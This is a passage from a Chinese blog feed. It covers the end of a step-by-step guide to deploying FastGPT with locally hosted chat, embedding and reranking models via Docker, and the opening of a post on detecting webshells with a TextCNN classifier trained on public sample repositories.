配置文件中与之对应即可）</li><li>密钥：本地大模型接口的<code>SK-KEY</code> 值</li><li>代理：<code>http://&lt;gpu_server_ip&gt;:8001</code></li></ul></li><li>添加 M3E-large<ul><li>类型：<code>自定义渠道</code></li><li>Base URL：<code>http://&lt;gpu_server_ip&gt;:8002</code></li><li>名称：<code>M3E-large</code>（随意）</li><li>模型：<code>M3E-large</code>（随意，FastGPT 配置文件中与之对应即可）</li><li>密钥：本地模型接口的<code>SK-KEY</code>值</li></ul></li></ul></li></ul><h2 id="部署-FastGPT"><a href="#部署-FastGPT" class="headerlink" title="部署 FastGPT"></a>部署 FastGPT</h2><ul><li><p>在本地创建文件夹并下载相关文件</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建文件夹</span></span><br><span class="line"><span class="built_in">mkdir</span> fastgpt</span><br><span class="line"><span class="built_in">cd</span> fastgpt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载相关文件</span></span><br><span class="line">curl -O https://raw.githubusercontent.com/Coldwave96/FastGPT-Deploy-Utilities/main/FastGPT/docker-compose.yml</span><br><span class="line">curl -O https://raw.githubusercontent.com/Coldwave96/FastGPT-Deploy-Utilities/main/FastGPT/config.json</span><br></pre></td></tr></table></figure><ul><li>注意: docker-compose.yml 配置文件中 Mongo 为 5.x，部分服务器不支持，需手动更改其镜像版本为 4.4.24</li></ul></li><li><p>修改 docker-compose.yml 中的 OPENAI_BASE_URL（API 接口的地址，需要加&#x2F;v1）和CHAT_API_KEY（API 接口的凭证)</p></li><li><p>使用 OneAPI 的话，OPENAI_BASE_URL&#x3D;OneAPI访问地址&#x2F;v1；CHAT_API_KEY&#x3D;令牌</p></li><li><p>修改 config.json 中的本地问答大模型、Embedding 模型以及 ReRank 模型的相关信息</p></li><li><p>在 docker-compose.yml 同级目录下执行</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入项目目录</span></span><br><span class="line"><span class="built_in">cd</span> 项目目录</span><br><span class="line"><span class="comment"># 创建 mongo 密钥</span></span><br><span class="line">openssl rand -<span class="built_in">base64</span> 756 &gt; ./mongodb.key</span><br><span class="line"><span class="comment"># 600不行可以用chmod 999</span></span><br><span class="line"><span class="built_in">chmod</span> 600 ./mongodb.key</span><br><span class="line"><span class="built_in">chown</span> 999:root ./mongodb.key</span><br><span class="line"><span class="comment"># 启动容器</span></span><br><span class="line">docker compose pull</span><br><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure></li><li><p>初始化 Mongo 副本集(4.6.8以前可忽略)</p><ul><li>Mongo 数据库需要修改副本集的host，从原来的mongo:27017修改为ip:27017。</li></ul>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看 mongo 容器是否正常运行</span></span><br><span class="line">docker ps</span><br><span class="line"><span class="comment"># 进入容器</span></span><br><span class="line">docker <span class="built_in">exec</span> -it mongo bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接数据库</span></span><br><span class="line">mongo -u myname -p mypassword --authenticationDatabase admin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化副本集。如果需要外网访问，mongo:27017 可以改成 ip:27017。但是需要同时修改 FastGPT 连接的参数（MONGODB_URI=mongodb://myname:mypassword@mongo:27017/fastgpt?authSource=admin =&gt; MONGODB_URI=mongodb://myname:mypassword@ip:27017/fastgpt?authSource=admin）</span></span><br><span class="line">rs.initiate(&#123;</span><br><span class="line">  _id: <span class="string">&quot;rs0&quot;</span>,</span><br><span class="line">  members: [</span><br><span class="line">    &#123; _id: 0, host: <span class="string">&quot;mongo:27017&quot;</span> &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment"># 检查状态。如果提示 rs0 状态，则代表运行成功</span></span><br><span class="line">rs.status()</span><br></pre></td></tr></table></figure></li></ul><h2 id="访问-FastGPT"><a href="#访问-FastGPT" class="headerlink" title="访问 FastGPT"></a>访问 FastGPT</h2><ul><li>目前可以通过<code>http://&lt;ip&gt;:8080</code>直接访问(注意防火墙)。登录用户名为<code>root</code>，密码为<code>docker-compose.yml</code>环境变量里设置的<code>DEFAULT_ROOT_PSW</code></li><li>如果需要域名访问，请自行安装并配置 Nginx</li></ul><h1 id="分布式部署"><a href="#分布式部署" class="headerlink" title="分布式部署"></a>分布式部署</h1><h2 id="部署对话大模型"><a href="#部署对话大模型" class="headerlink" title="部署对话大模型"></a>部署对话大模型</h2><ul><li>选择以下其中一种大模型部署即可</li></ul><h3 id="Baichuan2-13B-Chat"><a href="#Baichuan2-13B-Chat" class="headerlink" title="Baichuan2-13B-Chat"></a>Baichuan2-13B-Chat</h3><ul><li><p>推荐配置</p><table><thead><tr><th>类型</th><th>内存</th><th>显存</th><th>硬盘空间</th><th>启动命令</th></tr></thead><tbody><tr><td>fp16</td><td>≥ 32GB</td><td>≥ 28GB</td><td>≥ 50GB</td><td>python openai_api.py</td></tr><tr><td>int8</td><td>≥ 32GB</td><td>≥ 17GB</td><td>≥ 50GB</td><td>python openai_api.py（设置环境变量 QUANTIZE_BIT&#x3D;8）</td></tr><tr><td>int4</td><td>≥ 32GB</td><td>≥ 9GB</td><td>≥ 50GB</td><td>python openai_api.py（设置环境变量 QUANTIZE_BIT&#x3D;4）</td></tr></tbody></table></li><li><p>部署环境要求</p><ul><li>Python 3.10</li><li>NVIDIA 驱动 + CUDA 等套件</li></ul></li><li><p>源码部署</p><ul><li><p>将 Baichuan2-13B-Chat 模型文件下载到本地</p><p>  <a href="https://modelscope.cn/models/baichuan-inc/Baichuan2-13B-Chat">百川2-13B-对话模型</a></p></li><li><p>下载相关文件</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -O https://raw.githubusercontent.com/Coldwave96/FastGPT-Deploy-Utilities/main/LLM-Chat/Baichuan2-13B-Chat/openai_api.py</span><br><span class="line">curl -O https://raw.githubusercontent.com/Coldwave96/FastGPT-Deploy-Utilities/main/LLM-Chat/Baichuan2-13B-Chat/requirements.txt</span><br></pre></td></tr></table></figure></li><li><p>安装依赖</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure></li><li><p>设置环境变量<code>SK_KEY</code>，这是大模型调用接口认证 token，防止接口盗用</p></li><li><p>修改<code>openai_api.py</code>文件中模型名称<code>baichuan-inc/Baichuan2-13B-Chat</code>为本地模型所在文件夹</p></li><li><p>运行启动命令<code>python openai_api.py</code></p></li></ul></li></ul><h3 id="Baichuan2-7B-Chat"><a href="#Baichuan2-7B-Chat" class="headerlink" title="Baichuan2-7B-Chat"></a>Baichuan2-7B-Chat</h3><ul><li><p>推荐配置</p><table><thead><tr><th>类型</th><th>内存</th><th>显存</th><th>硬盘空间</th><th>启动命令</th></tr></thead><tbody><tr><td>fp16</td><td>≥ 16GB</td><td>≥ 16GB</td><td>≥ 25GB</td><td>python openai_api.py</td></tr><tr><td>int8</td><td>≥ 16GB</td><td>≥ 9GB</td><td>≥ 25GB</td><td>python openai_api.py（设置环境变量 QUANTIZE_BIT&#x3D;8）</td></tr><tr><td>int4</td><td>≥ 16GB</td><td>≥ 6GB</td><td>≥ 25GB</td><td>python openai_api.py（设置环境变量 QUANTIZE_BIT&#x3D;4）</td></tr></tbody></table></li><li><p>部署环境要求</p><ul><li>Python 3.10</li><li>NVIDIA 驱动 + CUDA 等套件</li></ul></li><li><p>源码部署</p><ul><li><p>将 Baichuan2-7B-Chat 模型文件下载到本地</p><p>  <a href="https://modelscope.cn/models/baichuan-inc/Baichuan2-7B-Chat">百川2-7B-对话模型</a></p></li><li><p>下载相关文件</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -O https://raw.githubusercontent.com/Coldwave96/FastGPT-Deploy-Utilities/main/LLM-Chat/Baichuan2-7B-Chat/openai_api.py</span><br><span class="line">curl -O https://raw.githubusercontent.com/Coldwave96/FastGPT-Deploy-Utilities/main/LLM-Chat/Baichuan2-7B-Chat/requirements.txt</span><br></pre></td></tr></table></figure></li><li><p>安装依赖</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure></li><li><p>设置环境变量<code>SK_KEY</code>，这是大模型调用接口认证 token，防止接口盗用</p></li><li><p>修改<code>openai_api.py</code>文件中模型名称<code>baichuan-inc/Baichuan2-7B-Chat</code>为本地模型所在文件夹</p></li><li><p>运行启动命令<code>python openai_api.py</code></p></li></ul></li></ul><h3 id="ChatGLM2-6B"><a href="#ChatGLM2-6B" class="headerlink" title="ChatGLM2-6B"></a>ChatGLM2-6B</h3><ul><li><p>推荐配置</p><table><thead><tr><th>类型</th><th>内存</th><th>显存</th><th>硬盘空间</th><th>启动命令</th></tr></thead><tbody><tr><td>fp16</td><td>≥ 16GB</td><td>≥ 16GB</td><td>≥ 25GB</td><td>python openai_api.py</td></tr><tr><td>int8</td><td>≥ 16GB</td><td>≥ 9GB</td><td>≥ 25GB</td><td>python openai_api.py（设置环境变量 QUANTIZE_BIT&#x3D;8）</td></tr><tr><td>int4</td><td>≥ 16GB</td><td>≥ 6GB</td><td>≥ 25GB</td><td>python openai_api.py（设置环境变量 QUANTIZE_BIT&#x3D;4）</td></tr></tbody></table></li><li><p>部署环境要求</p><ul><li>Python 3.10</li><li>NVIDIA 驱动 + CUDA 等套件</li></ul></li><li><p>源码部署</p><ul><li><p>将 ChatGLM2-6B 模型文件下载到本地</p><p>  <a href="https://modelscope.cn/models/ZhipuAI/chatglm2-6b/">chatglm2-6b</a></p></li><li><p>下载相关文件</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -O https://raw.githubusercontent.com/Coldwave96/FastGPT-Deploy-Utilities/main/LLM-Chat/ChatGLM2-6B/openai_api.py</span><br><span class="line">curl -O https://raw.githubusercontent.com/Coldwave96/FastGPT-Deploy-Utilities/main/LLM-Chat/ChatGLM2-6B/requirements.txt</span><br></pre></td></tr></table></figure></li><li><p>安装依赖</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure></li><li><p>设置环境变量<code>SK_KEY</code>，这是大模型调用接口认证 token，防止接口盗用</p></li><li><p>修改<code>openai_api.py</code>文件中模型名称<code>THUDM/chatglm2-6b</code>为本地模型所在文件夹</p></li><li><p>运行启动命令<code>python openai_api.py</code></p></li></ul></li></ul><h2 id="部署-Embedding-模型"><a href="#部署-Embedding-模型" class="headerlink" title="部署 Embedding 模型"></a>部署 Embedding 模型</h2><h3 id="M3E-large"><a href="#M3E-large" class="headerlink" title="M3E-large"></a>M3E-large</h3><ul><li><p>推荐配置</p><table><thead><tr><th>内存</th><th>显存</th><th>硬盘空间</th><th>启动命令</th></tr></thead><tbody><tr><td>≥ 8GB</td><td>≥ 6GB</td><td>≥ 10GB</td><td>python openai_api.py</td></tr></tbody></table></li><li><p>部署环境要求</p><ul><li>Python 3.8</li><li>NVIDIA 驱动 + CUDA 等套件</li></ul></li><li><p>源码部署</p><ul><li><p>将 M3E-large 模型文件下载到本地</p><p>  <a href="https://modelscope.cn/models/Jerry0/M3E-large/">M3E-large</a></p></li><li><p>下载相关文件</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -O https://raw.githubusercontent.com/Coldwave96/FastGPT-Deploy-Utilities/main/LLM-Embedding/M3E-large/openai_api.py</span><br><span class="line">curl -O https://raw.githubusercontent.com/Coldwave96/FastGPT-Deploy-Utilities/main/LLM-Embedding/M3E-large/requirements.txt</span><br></pre></td></tr></table></figure></li><li><p>安装依赖</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure></li><li><p>设置环境变量<code>SK_KEY</code>，这是大模型调用接口认证 token，防止接口盗用</p></li><li><p>修改<code>openai_api.py</code>文件中模型名称<code>moka-ai/m3e-large</code>为本地模型所在文件夹</p></li><li><p>运行启动命令<code>python openai_api.py</code></p></li></ul></li></ul><h2 id="部署-ReRank-重排模型"><a href="#部署-ReRank-重排模型" class="headerlink" title="部署 ReRank 重排模型"></a>部署 ReRank 重排模型</h2><h3 id="BGE-ReRanker-Base"><a href="#BGE-ReRanker-Base" class="headerlink" title="BGE-ReRanker-Base"></a>BGE-ReRanker-Base</h3><ul><li><p>推荐配置</p><table><thead><tr><th>类型</th><th>内存</th><th>显存</th><th>硬盘空间</th><th>启动命令</th></tr></thead><tbody><tr><td>base</td><td>≥ 4GB</td><td>≥ 3GB</td><td>≥ 8GB</td><td>python api.py</td></tr></tbody></table></li><li><p>部署环境要求</p><ul><li>Python 3.10</li><li>NVIDIA 驱动 + CUDA 等套件</li></ul></li><li><p>源码部署</p><ul><li><p>将 BGE-ReRanker-base 模型下载到本地</p><p>  <a href="https://huggingface.co/BAAI/bge-reranker-base">BAAI&#x2F;bge-reranker-base · Hugging Face</a></p></li><li><p>下载相关文件（与存放模型的文件夹在同一级）</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -O https://raw.githubusercontent.com/Coldwave96/FastGPT-Deploy-Utilities/main/LLM-ReRanker/BGE-ReRanker-base/api.py</span><br><span class="line">curl -O https://raw.githubusercontent.com/Coldwave96/FastGPT-Deploy-Utilities/main/LLM-ReRanker/BGE-ReRanker-base/requirements.txt</span><br></pre></td></tr></table></figure></li><li><p>安装依赖</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure></li><li><p>添加环境变量<code>export ACCESS_TOKEN=XXXXXX</code>配置 token，这里的 token 只是加一层验证，防止接口被人盗用，默认值为<code>ACCESS_TOKEN</code></p></li><li><p>修改<code>api.py</code>文件中<code>bge-reranker-large</code>为存储本地模型文件夹名称</p></li><li><p>运行启动命令<code>python api.py</code></p></li></ul></li></ul><h2 id="部署-OneAPI"><a href="#部署-OneAPI" class="headerlink" title="部署 OneAPI"></a>部署 OneAPI</h2><h3 id="Docker-部署"><a href="#Docker-部署" class="headerlink" title="Docker 部署"></a>Docker 部署</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 SQLite 的部署命令：</span></span><br><span class="line">docker run --name one-api -d --restart always -p <span class="number">3000</span>:<span class="number">3000</span> -e TZ=Asia/Shanghai -v /home/ubuntu/data/one-api:/data justsong/one-api</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 MySQL 的部署命令，在上面的基础上添加 `-e SQL_DSN=&quot;root:123456@tcp(localhost:3306)/oneapi&quot;`，请自行修改数据库连接参数，不清楚如何修改请参见下面环境变量一节。</span></span><br><span class="line"><span class="comment"># 例如：</span></span><br><span class="line">docker run --name one-api -d --restart always -p <span class="number">3000</span>:<span class="number">3000</span> -e SQL_DSN=<span class="string">&quot;root:123456@tcp(localhost:3306)/oneapi&quot;</span> -e TZ=Asia/Shanghai -v /home/ubuntu/data/one-api:/data justsong/one-api</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>其中，-p 3000:3000 中的第一个 3000 是宿主机的端口，可以根据需要进行修改</li><li>数据和日志将会保存在宿主机的<code>/home/ubuntu/data/one-api</code>目录，请确保该目录存在且具有写入权限，或者更改为合适的目录</li><li>如果启动失败，请添加<code>-privileged=true</code></li><li>访问<code>http://&lt;ip&gt;:3000/</code>并登录。初始账号用户名为<code>root</code>，密码为<code>123456</code></li></ul><h3 id="创建令牌"><a href="#创建令牌" class="headerlink" title="创建令牌"></a>创建令牌</h3><ul><li>可设置永不过期，无限额度</li></ul><h3 id="接入本地问答大模型"><a href="#接入本地问答大模型" class="headerlink" title="接入本地问答大模型"></a>接入本地问答大模型</h3><ul><li>类型：OpenAI</li><li>名称：随便写</li><li>模型：自定义模型名称</li><li>代理：本地大模型开放的 OpenAI 格式的 API 接口地址</li></ul><h3 id="接入本地-Embedding-模型"><a href="#接入本地-Embedding-模型" class="headerlink" title="接入本地 Embedding 模型"></a>接入本地 Embedding 模型</h3><ul><li>类型：自定义渠道</li><li>Base URL：Embedding 模型开放的 OpenAI 格式的 API 接口地址</li><li>名称：随便写</li><li>模型：自定义模型名称</li><li>密钥：开放接口定义的密钥</li></ul><h2 id="部署-FastGPT-1"><a href="#部署-FastGPT-1" class="headerlink" title="部署 FastGPT"></a>部署 FastGPT</h2><h3 id="Docker-Compose-快速部署"><a href="#Docker-Compose-快速部署" class="headerlink" title="Docker Compose 快速部署"></a>Docker Compose 快速部署</h3><ul><li><p>依次执行下面命令，创建 FastGPT 文件并拉取docker-compose.yml和config.json，执行完后目录下会有 2 个文件</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> fastgpt</span><br><span class="line"><span class="built_in">cd</span> fastgpt</span><br><span class="line">curl -O https://raw.githubusercontent.com/Coldwave96/FastGPT-Deploy-Utilities/main/FastGPT/docker-compose.yml</span><br><span class="line">curl -O https://raw.githubusercontent.com/Coldwave96/FastGPT-Deploy-Utilities/main/FastGPT/config.json</span><br></pre></td></tr></table></figure><ul><li>注意: docker-compose.yml 配置文件中 Mongo 为 5.x，部分服务器不支持，需手动更改其镜像版本为 4.4.24</li></ul></li><li><p>修改 docker-compose.yml 中的 OPENAI_BASE_URL（API 接口的地址，需要加&#x2F;v1）和CHAT_API_KEY（API 接口的凭证)</p></li><li><p>使用 OneAPI 的话，OPENAI_BASE_URL&#x3D;OneAPI访问地址&#x2F;v1；CHAT_API_KEY&#x3D;令牌</p></li><li><p>修改 config.json 中的本地问答大模型、Embedding 模型以及 ReRank 模型的相关信息</p></li><li><p>在 docker-compose.yml 同级目录下执行</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入项目目录</span></span><br><span class="line"><span class="built_in">cd</span> 项目目录</span><br><span class="line"><span class="comment"># 创建 mongo 密钥</span></span><br><span class="line">openssl rand -<span class="built_in">base64</span> 756 &gt; ./mongodb.key</span><br><span class="line"><span class="comment"># 600不行可以用chmod 999</span></span><br><span class="line"><span class="built_in">chmod</span> 600 ./mongodb.key</span><br><span class="line"><span class="built_in">chown</span> 999:root ./mongodb.key</span><br><span class="line"><span class="comment"># 启动容器</span></span><br><span class="line">docker compose pull</span><br><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure></li><li><p>初始化 Mongo 副本集(4.6.8以前可忽略)</p><ul><li>Mongo 数据库需要修改副本集的host，从原来的mongo:27017修改为ip:27017。</li></ul>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看 mongo 容器是否正常运行</span></span><br><span class="line">docker ps</span><br><span class="line"><span class="comment"># 进入容器</span></span><br><span class="line">docker <span class="built_in">exec</span> -it mongo bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接数据库</span></span><br><span class="line">mongo -u myname -p mypassword --authenticationDatabase admin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化副本集。如果需要外网访问，mongo:27017 可以改成 ip:27017。但是需要同时修改 FastGPT 连接的参数（MONGODB_URI=mongodb://myname:mypassword@mongo:27017/fastgpt?authSource=admin =&gt; MONGODB_URI=mongodb://myname:mypassword@ip:27017/fastgpt?authSource=admin）</span></span><br><span class="line">rs.initiate(&#123;</span><br><span class="line">  _id: <span class="string">&quot;rs0&quot;</span>,</span><br><span class="line">  members: [</span><br><span class="line">    &#123; _id: 0, host: <span class="string">&quot;mongo:27017&quot;</span> &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment"># 检查状态。如果提示 rs0 状态，则代表运行成功</span></span><br><span class="line">rs.status()</span><br></pre></td></tr></table></figure></li></ul><h3 id="访问-FastGPT-1"><a href="#访问-FastGPT-1" class="headerlink" title="访问 FastGPT"></a>访问 FastGPT</h3><ul><li>目前可以通过 ip:8080 直接访问(注意防火墙)。登录用户名为 root，密码为 docker-compose.yml 环境变量里设置的 DEFAULT_ROOT_PSW</li><li>如果需要域名访问，请自行安装并配置 Nginx</li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://fastgpt.in/&quot;&gt;FastGPT&lt;/a&gt; 是一款强大的 LLM + RAG 解决方案，本文记录了基于本地大模型搭建 FastGPT 框架的过程。&lt;/p&gt;</summary>
    
    
    
    <category term="AI" scheme="https://coldwave96.github.io/categories/AI/"/>
    
    <category term="Sites" scheme="https://coldwave96.github.io/categories/AI/Sites/"/>
    
    
    <category term="FastGPT" scheme="https://coldwave96.github.io/tags/FastGPT/"/>
    
    <category term="Docker Compose" scheme="https://coldwave96.github.io/tags/Docker-Compose/"/>
    
  </entry>
  
  <entry>
    <title>基于深度神经网络的Webshell静态检测</title>
    <link href="https://coldwave96.github.io/2024/02/22/WebshellCNN/"/>
    <id>https://coldwave96.github.io/2024/02/22/WebshellCNN/</id>
    <published>2024-02-22T03:40:08.000Z</published>
    <updated>2024-02-22T03:40:08.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>Webshell作为黑客惯用的入侵工具，是以php、asp、jsp、perl、cgi、py等网页文件形式存在的一种命令执行环境。黑客在入侵一个网站服务器后，通常会将webshell后门文件与网站服务器WEB目录下正常网页文件混在一起，通过Web访问webshell后门进行文件上传下载、访问数据库、系统命令调用等各种高危操作，达到非法控制网站服务器的目的，具备威胁程度高，隐蔽性极强等特点。</p><p>本文尝试通过一个 TextCNN + 二分类网络合成的综合深度神经网络实现对于 Webshell 的静态检测。TextCNN 用于处理向量化后的词数组，二分类网络用于处理手动提取的数字化特征（文件的大小以及熵值等等）。</p><span id="more"></span><p>2019年曾经做过一个简单的 Webshell 检测系统。源代码通过 N-Gram 分割的方式，对分割后的字符结合 TF-IDF 技术建立词袋，然后通过简单的机器学习算法如 NB、SVM 等进行二分类。现在的合成网络在利用 TextCNN 深度神经网络自动提取特征的基础上，结合手动设计提取的数字化特征，如文件大小，文件熵等信息，实现综合分类网络，对于一句话木马以及混淆木马有着更好的检测能力。</p><h2 id="数据集"><a href="#数据集" class="headerlink" title="数据集"></a>数据集</h2><p>原始数据集采集自 <a href="https://github.com/">Github</a>，下面是详细的仓库列表.</p><h3 id="黑样本"><a href="#黑样本" class="headerlink" title="黑样本"></a>黑样本</h3><ol><li><a href="https://github.com/tennc/webshell">tennc&#x2F;webshell</a></li><li><a href="https://github.com/JohnTroony/php-webshells">JohnTroony&#x2F;php-webshells</a></li><li><a href="https://github.com/xl7dev/webshell">xl7dev&#x2F;webshell</a></li><li><a href="https://github.com/tutorial0/webshell">tutorial0&#x2F;webshell</a></li><li><a href="https://github.com/bartblaze/PHP-backdoors">bartblaze&#x2F;PHP-backdoors</a></li><li><a href="https://github.com/BlackArch/webshells">BlackArch&#x2F;webshells</a></li><li><a href="https://github.com/nikicat/web-malware-collection">nikicat&#x2F;web-malware-collection</a></li><li><a href="https://github.com/fuzzdb-project/fuzzdb">fuzzdb-project&#x2F;fuzzdb</a></li><li><a href="https://github.com/lcatro/PHP-webshell-Bypass-WAF">lcatro&#x2F;PHP-webshell-Bypass-WAF</a></li><li><a href="https://github.com/linuxsec/indoxploit-shell">linuxsec&#x2F;indoxploit-shell</a></li><li><a href="https://github.com/b374k/b374k">b374k&#x2F;b374k</a></li><li><a href="https://github.com/LuciferoO/webshell-collector">LuciferoO&#x2F;webshell-collector</a></li><li><a href="https://github.com/tanjiti/webshell-Sample">tanjiti&#x2F;webshell-Sample</a></li><li><a href="https://github.com/JoyChou93/webshell">JoyChou93&#x2F;webshell</a></li><li><a href="https://github.com/webshellpub/awsome-webshell">webshellpub&#x2F;awsome-webshell</a></li><li><a href="https://github.com/xypiie/webshell">xypiie&#x2F;webshell</a></li><li><a href="https://github.com/leett1/Programe/">leett1&#x2F;Programe&#x2F;</a></li><li><a href="https://github.com/lhlsec/webshell">lhlsec&#x2F;webshell</a></li><li><a href="https://github.com/feihong-cs/JspMaster-Deprecated">feihong-cs&#x2F;JspMaster-Deprecated</a></li><li><a href="https://github.com/threedr3am/JSP-Webshells">threedr3am&#x2F;JSP-Webshells</a></li><li><a href="https://github.com/oneoneplus/webshell">oneoneplus&#x2F;webshell</a></li><li><a href="https://github.com/fr4nk404/Webshell-Collections">fr4nk404&#x2F;Webshell-Collections</a></li><li><a href="https://github.com/mattiasgeniar/php-exploit-scripts">mattiasgeniar&#x2F;php-exploit-scripts</a></li></ol><h3 id="白样本："><a href="#白样本：" class="headerlink" title="白样本："></a>白样本：</h3><ol><li><a href="https://github.com/WordPress/WordPress">WordPress&#x2F;WordPress</a></li><li><a href="https://github.com/yiisoft/yii2">yiisoft&#x2F;yii2</a> </li><li><a href="https://github.com/johnshen/PHPcms">johnshen&#x2F;PHPcms</a></li><li><a href="https://www.kashipara.com/">https://www.kashipara.com</a></li><li><a href="https://github.com/joomla/joomla-cms">joomla&#x2F;joomla-cms</a></li><li><a href="https://github.com/laravel/laravel">laravel&#x2F;laravel</a></li><li><a href="https://github.com/learnstartup/4tweb">learnstartup&#x2F;4tweb</a></li><li><a href="https://github.com/phpmyadmin/phpmyadmin">phpmyadmin&#x2F;phpmyadmin</a></li><li><a href="https://github.com/rainrocka/xinhu">rainrocka&#x2F;xinhu</a></li><li><a href="https://github.com/octobercms/october">octobercms&#x2F;october</a></li><li><a href="https://github.com/alkacon/opencms-core">alkacon&#x2F;opencms-core</a></li><li><a href="https://github.com/craftcms/cms">craftcms&#x2F;cms</a></li><li><a href="https://github.com/croogo/croogo">croogo&#x2F;croogo</a></li><li><a href="https://github.com/doorgets/CMS">doorgets&#x2F;CMS</a></li><li><a href="https://github.com/smarty-php/smarty">smarty-php&#x2F;smarty</a></li><li><a href="https://github.com/source-trace/phpcms">source-trace&#x2F;phpcms</a></li><li><a href="https://github.com/symfony/symfony">symfony&#x2F;symfony</a></li><li><a href="https://github.com/typecho/typecho">typecho&#x2F;typecho</a></li><li><a href="https://github.com/leett1/Programe/">leett1&#x2F;Programe&#x2F;</a></li><li><a href="https://github.com/rpeterclark/aspunit">rpeterclark&#x2F;aspunit</a></li><li><a href="https://github.com/dluxem/LiberumASP">dluxem&#x2F;LiberumASP</a></li><li><a href="https://github.com/aspLite/aspLite">aspLite&#x2F;aspLite</a></li><li><a href="https://github.com/coldstone/easyasp">coldstone&#x2F;easyasp</a></li><li><a href="https://github.com/amasad/sane">amasad&#x2F;sane</a></li><li><a href="https://github.com/sextondb/ClassicASPUnit">sextondb&#x2F;ClassicASPUnit</a></li><li><a href="https://github.com/ASP-Ajaxed/asp-ajaxed">ASP-Ajaxed&#x2F;asp-ajaxed</a></li><li><a href="https://www.codewithc.com/">https://www.codewithc.com</a></li></ol><h3 id="综合数据集"><a href="#综合数据集" class="headerlink" title="综合数据集"></a>综合数据集</h3><p>处理后的综合数据集存放在 <a href="https://huggingface.co/datasets/c01dsnap/Webshell">Hugging Face</a>.</p><h2 id="模型结构"><a href="#模型结构" class="headerlink" title="模型结构"></a>模型结构</h2><p>程序会从指定的文件夹中读取指定类型的文件，计算这些文件的大小和熵值，以及通过 <a href="https://www.nltk.org/">nltk</a> 